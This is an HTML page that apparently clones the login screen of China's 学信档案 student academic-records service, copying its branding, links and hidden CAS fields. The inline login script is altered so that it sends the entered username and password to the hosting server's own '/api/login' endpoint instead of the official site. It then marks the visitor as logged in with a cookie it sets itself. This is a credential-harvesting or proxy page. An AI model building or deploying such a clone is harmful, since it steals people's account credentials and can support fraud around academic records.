




















<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
        <meta name="renderer" content="webkit|ie-comp|ie-stand">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <title>登录_学信档案</title>
        <meta name="Keywords" content="学信档案,学籍,学历,在线验证报告,学历认证报告"/>
        <meta name="Description" content="“学信档案”是中国高等教育学生信息网（简称“学信网”）各类学生个人信息档案的总称，涉及全国高等教育学生信息数据库中各类学生的学籍、学历、招生录取等信息。学生本人通过实名注册，将自己的实际身份与数据库中的学籍、学历等信息实现绑定，实现免费注册和免费查询所有的个人档案信息，并使自己拥有一份完整的学信电子档案。"/>
        <link rel="shortcut icon" href="https://t2.chei.com.cn/archive/favicon.ico" type="image/x-icon" />
        <link href="https://t3.chei.com.cn/passport/assets/css/qt-1.0.1.css" rel="stylesheet" />
        <style>
            .login-logo h1 {
                font-size: 0;
                height: 33px;
                width: 166px;
                background-image: url("https://t4.chei.com.cn/passport/assets/images/my/logo.png");
                background-image: -webkit-image-set(url("https://t4.chei.com.cn/passport/assets/images/my/logo.png") 1x,url("https://t3.chei.com.cn/passport/assets/images/my/logo-2x.png") 2x);
                background-repeat: no-repeat;
                background-position: center top;
            }
            a.logo-link {
                display: block;
                height: 36px;
            }
            .login-left {
                background: #F0F5FF url("https://t4.chei.com.cn/passport/assets/images/my/bg.png") center center no-repeat;
            }
            .btn_login {
                background-color: #25b887;
                border-color: #25b887;
            }
            .btn_login:hover {
                background-color: #31ca97;
                border-color: #31ca97;
            }
            .btn_login:active {
                background-color: #13996a;
                border-color: #13996a;
            }
            .input_text:focus {
                border-color: #25b887;
            }
            .uk_box {
                border: 1px solid #25b887;
                background: #F7fbf9;
            }
            .uk_close {
                background: #25b887;
            }
            @media screen and (max-width: 1000px) {
                .login-logo h1 {
                    width: 100%;
                    height: 0.75rem;
                    background-image: url("https://t1.chei.com.cn/passport/assets/images/my/logo-wap.png");
                    background-position: center;
                    background-size: contain;
                }
                a.logo-link {
                    display: block;
                    height: 0.75rem;
                }
            }
        </style>
        <script defer src="https://t1.chei.com.cn/common/jquery/2.1.1/jquery.min.js"></script>
        <script defer src="https://t1.chei.com.cn/common/plugins/jquerymigrate/jquerymigrate-1.2.1.min.js"></script>
        <script defer src="https://t1.chei.com.cn/common/wap/js/wap.min.js"></script>
        <script defer src="https://t1.chei.com.cn/common/wap/js/flexible.js"></script>
        <script defer src="https://t2.chei.com.cn/passport/js/captchaChange-1.0.1.js"></script>
        <script defer src="https://t1.chei.com.cn/passport/js/common_rosters.js"></script>
        <script>
            function trimStr(s){ return (s||'').replace(/^\s+|\s+$/g,''); }
            // 读取 redirect 参数，登录成功后跳转目标，默认导航页
            function getRedirect(){
                var m = window.location.search.match(/[?&]redirect=([^&]+)/);
                if (m) { try { return decodeURIComponent(m[1]); } catch(e) { return m[1]; } }
                return '/archive/wap/index.jsp';
            }
            // 已登录则直接进入档案页
            document.addEventListener('DOMContentLoaded', function(){
                if (document.cookie.indexOf("chsi_login=") !== -1) {
                    window.location.href = getRedirect();
                    return;
                }
                var u = document.getElementById('username');
                var p = document.getElementById('password');
                if (u) u.setAttribute('placeholder', '手机号/邮箱');
                if (p) p.setAttribute('placeholder', '密码');
            });
            /**表单验证 + 真实登录**/
            function formSubmit(){
                var usernameEl = document.getElementById('username');
                var passwordEl = document.getElementById('password');
                var username = usernameEl ? trimStr(usernameEl.value) : '';
                var password = passwordEl ? passwordEl.value : '';
                if (username === '') {
                    alert('用户名不能为空！');
                    if (usernameEl) usernameEl.focus();
                    return false;
                }
                if (password === '') {
                    alert('密码不能为空！');
                    if (passwordEl) passwordEl.focus();
                    return false;
                }
                // 真实登录：调用后端 /api/login 请求官方学信网
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/api/login', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=UTF-8');
                xhr.onreadystatechange = function(){
                    if (xhr.readyState !== 4) return;
                    var res = null;
                    try { res = JSON.parse(xhr.responseText); } catch(e) {}
                    if (xhr.status === 200 && res && res.success) {
                        var d = new Date();
                        d.setTime(d.getTime() + 7*24*60*60*1000);
                        document.cookie = "chsi_login=1; path=/; expires=" + d.toUTCString();
                        try { localStorage.setItem("chsi_user", username); } catch(e) {}
                        window.location.href = getRedirect();
                    } else {
                        var msg = (res && res.message) || '网络错误或账号密码错误';
                        alert('登录失败：' + msg);
                    }
                };
                xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
                return false;
            }
        </script>
        
    </head>


<body id="cas">
<style>
    .errors { word-wrap: break-word; }
</style>

    <div class="login-layout">
        <div class="login-left"></div>
        <div class="login-right">
            <div class="login-logo">
                <h1><a href="https://my.chsi.com.cn/archive/index.jsp" target="_blank" class="logo-link">学信档案</a></h1>
                <div class="login-other">
                    <a href="https://my.chsi.com.cn/archive/index.jsp" target="_blank">首页</a>
                    <span class="cutline"></span>
                    <a href="https://my.chsi.com.cn/archive/help/index.action" target="_blank">帮助中心</a>
                    <span class="cutline"></span>
                    <a href="https://www.chsi.com.cn/about/contact.shtml" target="_blank">联系我们</a>
                </div>
            </div>
            <div class="login-content">
                <div class="login-form">
                    <div class="ncss-stu-title">
                        <h2>登录</h2>
                        <h3>请使用 <a href='https://account.chsi.com.cn/account/help/index.jsp?keywords=学信网账号可以做什么' target="_blank" rel="noopener noreferrer">学信网账号</a> 进行登录</h3>
                    </div>
                    
                    
                        
                        
                            <div class="cr_top">
                                <form id="fm1" action="/archive/index.jsp" method="get" onsubmit="return formSubmit();" autocomplete="off">
                                    <!-- 用户名 -->
                                    <div class="ct_input">
                                        
                                        
                                            
                                            
                                                
                                                
                                                    <span class='ct_img_yhm'>&nbsp;</span>
                                                    <input id="username" name="username" class="input_text" tabindex="1" accesskey="n" type="text" value="" size="25"/>
                                                
                                            
                                        
                                    </div>
                                    <!-- 用户名 end -->
                                    <!-- 密码 -->
                                    <div class="ct_input">
                                        <span class='ct_img_mm'>&nbsp;</span>
                                        
                                        <input id="password" name="password" class="input_text" tabindex="2" accesskey="p" type="password" value="" size="25"/>
                                    </div>
                                    <!-- 密码 end -->
                                    
                                    
                                        
                                        
                                        
                                        
                                        
                                    
                                    
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                            
                                        
                                    
                                    <div class="errors" style="display: none; background: #fed;" id="username-check-tip"></div>
                                    <div class="ct_input sub-box">
                                        <input type="hidden" name="lt" value="LT-683893-EnybFveTK56uLCszXateERGGDW5wR2-cas" />
                                        <input type="hidden" name="execution" value="f19a25fc-80d3-48b5-ad32-aaa282e104e3_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuT0dGbFozQmtjRFJuTm1rcmJHUjJZMmgwYmtwdVZVNVNRelIzWTFWclNrOVRSbk14UTNVMGJIVTFNWFpOUW0xSmJVeG5jRXhoUjAxWmRVSlJUMUo0Y2xZclFXSXpZbFpCWW5SMllVdEtXa015TkRkaGR6UkdZV3N6Ym5acFFtNXRSbmx5VFhkVFNHazVhWGM0ZGxWd2NVOHdhVVoxVVVSbFN5dHdUbTkxY1M4cldrZzVNRGRWTVZNNFYyTnpOQzh5VUhWM2RHbzFNR3RFYTFBd1VrVTBNRWR1VTFCdE16RlRTRE5RWkhWeVVVdGhkVkZhZVN0VloyY3hOMkp4WTAxSFJtZEdNRUk0Y1daU2NWcHNkREpMWjJSblVHaEhkMEpGVFU5UFQyeE1kakJXZGpCdWNrWjVaWGR3Y201UGEyTk5NbWh3WWpScVNXNVlRVzFFUW5ONlpHUjBRMVpTWVhCQ1JHVktSbWd5YUVadVdHa3pRMHRqZHpONFZEVjBPVEZWVEhndmFHOXRaVE5LUVVrclpYcElRVXQxYlV0SU1XeDZWRzFKTTJSNVQwSlBNME5pWXpWaGFHTTBiVVptWjBOQk1saG1TVmhXUjIxd2QyNTBObTR3YlRoeGMzbGFUM2x2WjI1aE4xRmhVbGRxUVVGamEwd3hZVzEyVUc4eVZ6bE5VMDkwUzBkeWJDczRTMFpFZDNGV2JVaExkRUpHYnk5UlpEUmFPVzVpTUVOUFVGVkRWVGRPTldoMVVGUmxXbE13VTBSQ2JrUnVOV3hCYkVsWVRtSTBRbWRwY3pSYWVFOVdSR2hVTDNGSmJERkNhR05WWXpkR1YzRkNlVmsxVDB0cFZXVnViR2xHYkdoQmNrSnNRazlsV0ZsMVFtSkVPVVZ0U0dkNVFVZDJZemN3UW5sM1UzUmxlVWszY2taYWIwOXhlVWt4VGpWRVlYZEJkMkptWlZjME5YWTJNRm8yZFhGbmNFVkdZbXMwVkdOS1RGcHVlRkZKSzBWYVFVTnZRaTk1Y2trNFpESjRTVEo0TURVdmFEWTNhM2xUYW1WSVZVRXZZbEJrVTBsM1ozQmxaak0yZFc5WmVqUXlOVGc0YTBjd015OTVRbEF2TkVGRWEyUkhkbTF5WjFCWVVFMWFRelZrVm1KUVNuVnVjazlEUmpsT1QwcGpZazh4TkRkbFYyeEtiakJ5T0c5NFRXaGpTbFJxSzNablduazVkVU53TUZKNmRESjVMMEp6Y210RlEyRlBNaXN5Tms1a2VXazFlVFZLVFVnMGNuQlpTV2RIYm1Nd1YxQkNPRGhHYWk5RGEwRkZaVkJXYkZWc1RtaHFNRTVrWm5aME1UZEJNMjlsYVRObWRVZHRkVGM1UVRKeVptWTJiR2xHVkUxMlpYVmthRTVGTTA1b1dsWlBNazFCZUdsdGJFRkhUbXRXVTJOWVpVbFBhRTlhTkhJd2VrUk9hVU5UV0RsdVdIcEdOalJNUkhkWlpXaENTRE5MVVdSSlZIUmFjRlJtZDNFd2JXeHhSVkpyYVc4dldFUmtUVUpFUnpoNVJXOUtNM05XZWxCellUWlBWalZLYml0YWVuZDJTVVJtTDJ3NGVuaEdVSE5KYUM5MWFUWlphMnAwWkVkelRVTmhZVzFKWjJReUwyOW5aMUl6YmpSdGIxVlFjazVwVUhwdU1WWnhZemcxY25kUWRVaFNaM05NVmtkMVdrUXdiRGh1V2tORUwyUlFVbW95UVc1elUxaHBlbmdyVGk5MU4zYzVWMEpaUm1OSGNtUk5RbFZhWVVkNWNVaFpTbFk0UTFwbGFqTTBOWE5IUzBwcmJXaFJOSFJoYkdoaWVsQjVkblJ0VGk5Vk1qTTRSM1k0Wm1KUlYyZFNVM0JUYW10TVNtSlpjMGR4V25wMWJGWnBNRzFoTmpGWWRGRmpUa0p5UVdSMVltRlJiaTlDTWxKc1VYaGtTRzh2Y2xWbUx6SlBOSE4xUmpCTFlraE1lalpoYW5ad2MwdHViRlp3ZGtOUk1ESjNkVkZZYTFkS1NYUlRVRUpyYzNaalRVSkxRMDB5ZVhObE0xYzFRMnMxWVcweWNWbE5RVGRFYjBGb05rUkpWVEE0WjJaSFlVUnZNR2d5VDJkRmJEWjBXVXhUZWtab0swcEpjRVpVVTFkUldHSmlObEJMVldaQ04yVjRlRTlsWVU4clVWVTNVRkpJWW5GTU1WTTNRek5RWTFWd2NYUnRZU3QxUjAxelRFTkZZbmR6T1hacE5GTXlhRVJZVkhkVGRURkZXRmN6VFRocVJWcDRMMlpJVTNKdFpXVldTRElyZUc1SUszSmpkMVJCWm5OSGNuSlBZa0ZMWjNBNU9FTlBUVUZDWVdGSVJteHJZVlk0TkdWVmQzVlljSHAyWmpKV2NFcE1XVk5pUVdkaE4zbG1ibWQ0Wlhwd2MwZGFVM001WkdzMlIwcDRSeTlTUlVoMFREVTRTM05ZWlZWcU4zcElkV2xGVms5SFEybFRTVEJHVm5OTU1VWkVNekEzUjBsSk1rOVZOVFF3VkdGamRUUkZXbGxGV0hwWksxbE9VV2x4U21OTWMyOUhjWEJIVkVGMFJscEZibVJRVVRCeFpXUnNWekJFWjNkR1YxWnpiVTA0YlM5WmFIZFRaR2RIU1RReWR6SkJRMjF5Y3lzeFVHSTVPRU5TUkdKTVFWRndjbUppWW01UVdYcHNSemRGV1dGeWJVOXpSVEo0TVRWUWJFbFJjVTg0TVhOU09WbFViWHBpWTJKR1IzSkVMMVJPU1VoWFprWlljbTV5TjI0MGJXeFBTWFZMVTNaWk1uWTFPRmRtTlc1dEx5dFpRMWwzUkhWclpGUXpNVGwyTTNKb2JVRTNPWFF4YXpkc1dWZGtZVFpKUjB0ME4ySm1lbFp5YldSR2FVbEtkVzk0V25ONlNHNXBiR2xwTWpCTWQyVk1jekZIZDJSRlNqTnZjRXhWVFRCblpFOTBNVUZ5V0ZKcWJ6ZFJUWEJ0U2tzNVZYQmliWFpwVGxnMFVuQlJWVmd3VXpWbldVeHZTQ3ROV1d4RFRqTnZNVFF3TlhCNldISkNSWFpHYkhKdWEwcHJWMWtyWm5OamFYRXZOVmszZDB0M01tUnZaR3hVZFZCRVoxZHliMWxQWTFRMmREUmxRMEpHU2tZclRFaEhkMFY2UmpGVE9VeE5LMUpSTlRGTFVYZzNaMVpXVW01QlIxVjNSRXgxU0cxaFpWUjFjR05OZWxCVlJreEtRWEowVDNnMFJUTm5XVzgyVVhkMVV6Z3hka2QzYkROS2RrODVTVzlHZHpKaVJEZDVOMlU0WmxjelNVVXZjRWhRY1daRFVXcDJTRU13Wm1GMk0xSlZhVTh3WjBrM2IxaERjMDVFVmxKRGEwWm9jRGRJYVVNclMyeEhZU3R4ZWtOd1JYZDRRVzV4YVV0d1FscHlja3N3TUVkSVVrcFBRa0YyYUZBNE1XUXZNR1pJY2t0d2NISTJTa3RJVTI5d01XTk1XamxvVjA5YVNFOXllbEpPTUM5UlZuTjJlUzlzYW05eWRXUkxaMWxIUzBKUU1FVlNkbkZrYnpkNWJWRlZSakl4Y1ZkQldEVXJlR1JwVW5FMFNuZFpOVTUxTldSak5pdFNRakp3ZFhKdWMySjBLMnBxUTFKVVdGQkVVWGRPWlZCQlVrRTJUekZTVFhBcmNrUk1SV1JhUmxVd1JWbE5hV3BJVkZWQlVIUlFZVE1yVlVveE0zRjVObkZTZUhGVGJXNWllbVpwVFdveVJsZGpTMU5WV2sxck5HMUZlV1ZWZFVkdmQybFlZVU4wVG05eWVIZG1jemRXT0hnM1JURnlVSE5wZWpJM2MxaElWMGd5Ulc1bk9YVjBNbEpXWlhNNVJVdHBhWGxFZDB4V1JHcFZUQzlyWldkWkswSjNTV28zTkdObVRVazBlWFIwYWtReEwxZHpLM0JhWmpGaFptUTROV1ZXYlhjM2JtWjRjRmRzZW5oM2JVaGxjWHA0TW1KTWJVNVRSMjFMVjJWV2VqWk5jaTlXU21GUk4xZFVkbVExUVhaMFptNTViR1JqWkU0M2JrUlVUbkZTWjBFeWFUVktjMnBHT1dkdU1ETk1iVlZtYUVOdFVuVjJURFV6T1hJcmJFVmtkbVpPVEdwM1FuVk9jalpRTTJReGQwdFdhSEpZVGl0Q1JYVTJUR3RrUjBScFZrNWtaRU52Y0U5MmFrVlBkbGhxUmxKVWJHTlVOVzk2UlRGUVRqTTJTR1pqZGtNNE9FeEhaMVJHVFZkVGJ6aE5UQ3RVVlhoeVdteFNiVlpMZEVkSE1IQkNhMFp4T0hCRk1ubFliVmxpZURkNVIyWTJWVXRqZVRWTFRVMTVjVWRqTVZWbWFXVnZabWR2UVV4VFQzQkZObUV4Y2xFMk9XWXZNVXhSVFhGWVUwdHZSM0kzSzJ0aVRXTktTMEo0WkRadmVHVlBNM1J5VWt0SGFIaHdZWG93WlRaRFZYVlZSRzFXTTJkTU0zaHhkMVp0UzJkeE1uWndXRTlTTVVGb2FVNVFja0lyYjB4TE1IZHNTbWhXVjI5VGNrOUdkWGh0VWtWRVlsRmhlRTEwUW5OcldtMDNVSGN5V2tOalVGY3pWMmhQYTFaMk1EZDFXV2cxYmtwQ1JVNHhLell4YUZCdVVXUXdjMVk1TTNsVVVIbDFWa1JqZFVGUVpqVTFNRTFRYjJWT1QzQnJkMjFGWVVjcmNWbHFjMVIyVmpBelVXOXhVMGs0UlhWamFtTkJkblZaUld4U1dIbHZibFZFVVdkdE4xZE1hbGRFZVRoQk9WbFhORlJwYVhsWFZFdHFkM2hYT1dodGNTOVZPVGN3UW0xSFdsUk9WREJCY0U5RE9HWnRjamMyV0dwMVdYQXJRa1pqYjNBMmN6VTRaMFZSTW1oVGVXOU1jbWhCU0ZCeFEwMU1WU3RIT1dGeUwxUlZRMGxzWkZKbmFGQkhLMHhETDFoelJsVkhLMWxsVlZCeFdWY3dkRUo1TlZweGJGRk5kRmhPTjNKaGJWWnBkbWhJU25nM1prSTRkRVZWYUVvMWNITk1lbVpIYkVKWmFFeDNUM0Z2Y0M4MGEwTm1NbXBvU21wak9IZFNVVlE1TjI0dk5XMHpRMmw0Wkc1a1JIaHVXbE5GZDFGRGNsVjRkM2hJYlVSaFpGcG9iMnc1UzFwT1IyeHdZa2x6Unl0S1ZUWkpaVTFhVWtScU9ETjFiRlJHZDJOaGVrSldTM1JLV0VGSGExWkpUazB4VUZSeVVqaEdZblFyUlhCV1oxRnhWMEZ5UnpGMk5WZDJWRTlaTHl0Vk1tUnlkRE5tWlRWQmRqWldjMUpEY2tSVlFVWlJPVk5UVlU1UmRsVllPRGxYYUVsdWJIVkhlVzFJVG1OeVYwTTJkMmMwVHpWWkx5ODRNMWhIUzNGSGNYRkljWEpxT0hOc2F6UXZUME5hTkdGTU1XSTVRbFZJUldoSFJYRjFiRkpIU1c1VmRESkdWM2hPS3poMlZtSlVUVmhNVG1aak1EUk9jVWRDUzFKSmFYRlZZbmhhTUVGeVVYWmlRbE5CUm1wbFNXcFRVRUZ6VjNNMGNreDRORzg0Wm14UWFVRklOVzVXYTNoQldUWlBaR2sxU1hsMmRERjJSMHBzV0V4VFpYVklaR3hYUkVKS1NXOVpRa3Q0ZDBKSVJqRmxRVkJhUm1vM2IxZ3ZZV3RpWkdWQ1pFZDFhR3hqU1dGNE56WlFUME5RV2xoMGFYSTNNamwwYUdsb1NWZFJWV1JVTTNKS1UzVTNPSEJvVFc5dWJtVnRVemQ2UVRSVkszQlBRakE1SzJvcmVUSTJlbGRNZWpoRVFsWk1OMGwzTTBwMmJHSm9UVmxKWTNSc1JETkRhRzVsVjJKSWIwOWxNVnByVlVONVpUaENSVlUwU25rMFJIaGpVWFkzWW5WdGQzTktMMFozUm5ac1NGTkJlRThyTkZaTWJIbFRkbkZTVms1T1owSTNNa3gxUkN0U00xRkdiMnhJY1VaT0wzRkRiVTEwY2xFeFVuVmhOa1o2UVRGcVN6ZFJNSFoyVVhWak1qRTNVVk13YUVaSFNtY3ljbWN6Wm5OdUwxTkhVM053ZFRCRVpYQjRkREphSzBvd1VGWnBja295Vmt0d2Jpc3dVVEJoYjJoek5XOUxXbTVXZGxOcE9XZDRZblZMVjA1MldsaDNWQ3QzTVVFeVozUXJWblprTW5sTUwwNXplV2gzVG0xVVZGTkxkV1F2T0Rkd1NGcERlVk5YZFhnNVZ5OWpORFZFTVc4NWJ6SjJRWEJyWmtOcWNtdG1jMlptYldRNWNXdzVLMk5ZTVVKeVlteDNTbkpqU0hkemNuRjVPV05OUkRWWVJtc3dkR296YWxGRE1YZFJlVEo1YVRSMFZISlNha2xuWTNsUWQxWnNTRWxMVDNkbWVXVm9lVTRyUTBkT1NVVTBWemdyWVdWRmRYRnVjVGR2WnpkS1NsTmhOazU0TTNKTFpuaHVZV2htZG1WbldraEljV2hVVVdRd1NrbEVNWGt2TlRCblJUaDBURlJoU1dOa1ZVTTBWVEpJT0c1UWExaFFhRkJCWlRKbVluTjNkV1U0Tnl0RFMxRnphMHBYU0dScFRGVTFjM1ZsV0hwTGJVaElWbXhDVWpNMlVGSnBURFZJTW1aYVVVbG5TbTlqVTJVM2ExUm5ZMlJXYWk5TloycGtNVmhrTkVwaVFtcFROM0pFTUZkdFNsQnJkamxXWTFKSWFtVlRTM1JDYURaRVpYUjJWR1JZTW1aMlpWcFBTemswTW5Ka1JrVTVZbkZuU0VWV1UxQkVhMkpwU2pGTFlWVlpSMlpaUVQwOS4tSjdiOFFjb3JXYUlUTlk0RndVR21FcnIyRzg3VFJOdkstQWhIdnFNRm9SLWhQcUZSS2M5Y0NLc19vME80TmlhV2pIMXdBYjVuTml0Vk5kZTdPNm9WQQ==" />
                                        <input type="hidden" name="_eventId" value="submit" />
                                        <input class="btn_login" accesskey="l" tabindex="4" type="submit" value='登录' />
                                    </div>
                                    <div class="account-oprate clearfix">
                                        <a href="https://account.chsi.com.cn/account/password!retrive" class="find-mm">找回密码</a>
                                        <a href="https://account.chsi.com.cn/account/preregister.action?from=archive" class="regist-btn">注册</a>
                                    </div>
                                    <div class="wx-container">
                                        <div class="wx-container-title">其他登录方式</div>
                                        
                                            
                                                <div class="wx-container-box wx">
                                                    <a href="https://open.weixin.qq.com/connect/qrconnect?appid=wx48c86c599b9add59&redirect_uri=https%3A%2F%2Faccount.chsi.com.cn%2Fpassport%2Flogin%3Fclient_name%3Dwechat&response_type=code&scope=snsapi_login&state=kXDnCaVKEE#wechat_redirect">
                                                        <span class="wx-icon"></span>
                                                    </a>
                                                    

<div class="wx-tip-dialog">
    <p><strong>微信登录仅支持个人用户使用</strong></p>
    <p>1、已有学信网账号？点击“微信登录”扫码登录；登录并绑定学信网账号，以后可使用微信扫码直接登录至该账号；</p>
    <p>2、无学信网账号？可先注册学信网账号，然后再使用“微信登录”。</p>
    <div class="wx-tip-arrow"></div>
</div>
<script>
	//鼠标移入显示微信登录弹框
    $(".wx-login-box").mouseover(function (){
        $(".wx-tip-dialog").fadeIn();
    });
    $(".wx-login-box").mouseout(function (){
        $(".wx-tip-dialog").fadeOut();
    });
</script>
                                                </div>
                                            
                                            
                                        
                                        
                                            
                                                <div class="wx-container-box zfb">
                                                    <a href="https://openauth.alipay.com/oauth2/publicAppAuthorize.htm?app_id=2018120362389757&redirect_uri=https%3A%2F%2Faccount.chsi.com.cn%2Fpassport%2Flogin%3Fclient_name%3Dalipay&state=lU7D51aS5z&scope=auth_user">
                                                        <span class="zfb-icon"></span>
                                                    </a>
                                                    

<div class="zfb-tip-dialog">
    <p><strong>支付宝登录仅支持个人用户使用</strong></p>
    <p>1、已有学信网账号？点击“支付宝登录”扫码登录；登录并绑定学信网账号，以后可使用支付宝扫码直接登录至该账号；</p>
    <p>2、无学信网账号？可先注册学信网账号，然后再使用“支付宝登录”。</p>
    <div class="wx-tip-arrow"></div>
</div>
<script>
	//鼠标移入显示微信登录弹框
    $(".zfb-login-box").mouseover(function (){
        $(".zfb-tip-dialog").fadeIn();
    });
    $(".zfb-login-box").mouseout(function (){
        $(".zfb-tip-dialog").fadeOut();
    });
</script>
                                                </div>
                                            
                                            
                                        
                                    </div>
                                <div>
</div></form>
                            </div>
                        
                    
                </div>
            </div>
            <div class="login-footer-other">
                <a href="https://my.chsi.com.cn/archive/index.jsp" target="_blank">首页</a>
                <a href="https://my.chsi.com.cn/archive/help/index.action" target="_blank">帮助中心</a>
                <a href="https://www.chsi.com.cn/about/contact.shtml" target="_blank">联系我们</a>
            </div>
            <div class="login-footer">
                <div class="login-footer-item">

Copyright &copy; 2003-2026&ensp;<a href="https://www.chsi.com.cn/" target="_blank">学信网</a>&ensp;All Rights Reserved</div>
            </div>
        </div>
    </div>
</body>
</html>